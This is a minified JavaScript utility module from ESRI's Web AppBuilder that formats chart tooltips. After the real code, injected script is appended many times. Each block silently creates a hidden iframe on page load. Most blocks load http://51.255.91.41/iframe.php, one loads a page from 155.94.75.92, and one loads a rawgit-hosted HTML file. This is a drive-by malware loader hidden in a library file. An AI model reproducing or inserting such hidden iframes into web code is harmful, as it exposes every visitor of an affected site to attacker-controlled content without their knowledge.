// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define(["jimu/utils","esri/lang","dojo/_base/config"],function(g,h){return{tryLocaleNumber:function(a){var c=a;if(h.isDefined(a)&&isFinite(a))try{var b=g.localizeNumber(a);"string"===typeof b&&(c=b)}catch(e){console.error(e)}return c+""},isAxisChart:function(a){return"column"===a.type||"bar"===a.type||"line"===a.type},getAxisZeroPosition:function(a){if(!this.chart)return!1;var c={},b=0,e=0;if((g.isNotEmptyObject(a.dataZoom,!0)||a.scale)&&a.series&&a.series[0]&&a.series[0].data){var f=a.series[0].data;
g.isNotEmptyObject(f,!0)&&("bar"!==a.type?e=g.getMinOfArray(f):b=g.getMinOfArray(f))}if(a=this.chart.convertToPixel({xAxisIndex:0,yAxisIndex:0},[b,e]))b=a[1]-5,c.left=a[0]-5,c.top=b;return g.isNotEmptyObject(c)?c:!1},_getDisplayValue:function(a,c){a=this.tryLocaleNumber(a);"number"===typeof Number(a)&&c&&(a=(100*a).toFixed(2),a+="%");return a},generateToolTip:function(a,c,b,e,f){var d="",d=b?'\x3cdiv class\x3d"tooltip-tr reverse"\x3e':'\x3cdiv class\x3d"tooltip-tr"\x3e';b='\x3cdiv class\x3d"colorEl marginRight5" style\x3d"background-color:'+
g.encodeHTML(a.color)+'"\x3e\x3c/div\x3e';d+=b;b="";"radar"!==a.seriesType&&this._isVaildValue(a.seriesName)?b=a.seriesName:this._isVaildValue(f)&&(b=f);d=""===b?d+("\x3cdiv\x3e"+b+"\x3c/div\x3e"):d+("\x3cdiv\x3e"+b+"\x3c/div\x3e\x3cdiv\x3e : \x3c/div\x3e");d=this._isNotZeroBoolean(c)?d+("\x3cdiv\x3e"+this._getDisplayValue(c,e)+"\x3c/div\x3e"):this._isVaildValue(a.value)?d+("\x3cdiv\x3e"+this._getDisplayValue(a.value,e)+"\x3c/div\x3e"):d+"\x3cdiv\x3enull\x3c/div\x3e";"pie"===a.seriesType&&(d+='\x3cdiv class\x3d"space-left"\x3e('+
a.percent+"%)\x3c/div\x3e");return d+"\x3c/div\x3e"},handleToolTip:function(a,c,b,e,f){var d='\x3cdiv class\x3d"tooltip-div"\x3e';Array.isArray(a)||(a=[a]);this._isVaildValue(a[0].name)&&(d+='\x3cdiv class\x3d"tr"\x3e'+a[0].name+"\x3c/div\x3e");a.forEach(function(a){d="radar"!==a.seriesType?d+this.generateToolTip(a,c,b,e,f):d+this._handleRadarTooltip(a,b,e,f)}.bind(this));return d+="\x3c/div\x3e"},_handleRadarTooltip:function(a,c,b,e){var f="";(a.value||[]).forEach(function(d,g){f+=this.generateToolTip(a,
d,c,b,e[g])}.bind(this));return f},_isVaildValue:function(a){var c=!0;"%00-"===encodeURI(a)?c=!1:a||"number"===typeof a||(c=!1);return c},_isNotZeroBoolean:function(a){return 0===a?!0:!!a}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});